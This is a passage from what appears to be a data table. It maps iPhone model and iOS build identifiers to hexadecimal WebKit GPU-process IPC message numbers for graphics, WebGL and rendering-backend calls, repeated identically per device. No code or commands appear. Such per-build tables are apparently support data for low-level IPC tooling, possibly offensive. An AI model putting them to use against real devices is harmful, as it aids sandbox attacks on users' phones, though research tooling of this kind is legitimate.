      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone17,5_22E240": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone11,2_4_6_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone11,8_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone12,1_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone12,3_5_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone12,8_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone13,1_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone13,2_3_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone13,4_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone14,2_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone14,3_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone14,4_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d5,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e0,
      RemoteImageBuffer_PutPixelBuffer: 0x4e6,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a4,
      RemoteRenderingBackend_CacheFont: 0x5a8,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ac,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bc,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c1,
      SyncMessageReply: 0xbdd,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xaca
   },
   "iPhone14,5_22E252": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbd9,
      ProcessOutOfStreamMessage: 0xbdb,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3ca,
      RemoteDisplayListRecorder_FillRect: 0x3df,
      RemoteDisplayListRecorder_SetCTM: 0x3ea,
      RemoteDisplayListRecorder_StrokeRect: 0x3fe,
      RemoteGraphicsContextGLProxy_WasCreated: 0x408,
      RemoteGraphicsContextGL_AttachShader: 0x40c,
      RemoteGraphicsContextGL_BindBuffer: 0x411,
      RemoteGraphicsContextGL_BindTexture: 0x417,
      RemoteGraphicsContextGL_BufferData0: 0x424,
      RemoteGraphicsContextGL_BufferData1: 0x425,
      RemoteGraphicsContextGL_BufferSubData: 0x426,
      RemoteGraphicsContextGL_CompileShader: 0x432,
      RemoteGraphicsContextGL_CreateBuffer: 0x43f,
      RemoteGraphicsContextGL_CreateProgram: 0x441,
      RemoteGraphicsContextGL_CreateShader: 0x446,
      RemoteGraphicsContextGL_CreateTexture: 0x447,
      RemoteGraphicsContextGL_Finish: 0x46f,
      RemoteGraphicsContextGL_Flush: 0x470,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0d,
      RemoteGraphicsContextGL_GetShaderSource: 0xf25,
      RemoteGraphicsContextGL_LinkProgram: 0x47a,
      RemoteGraphicsContextGL_PixelStorei: 0x482,
      RemoteGraphicsContextGL_Reshape: 0x48d,
      RemoteGraphicsContextGL_ShaderSource: 0x496,
      RemoteGraphicsContextGL_TexImage2D1: 0x49f,
      RemoteGraphicsContextGL_UseProgram: 0x4cd,
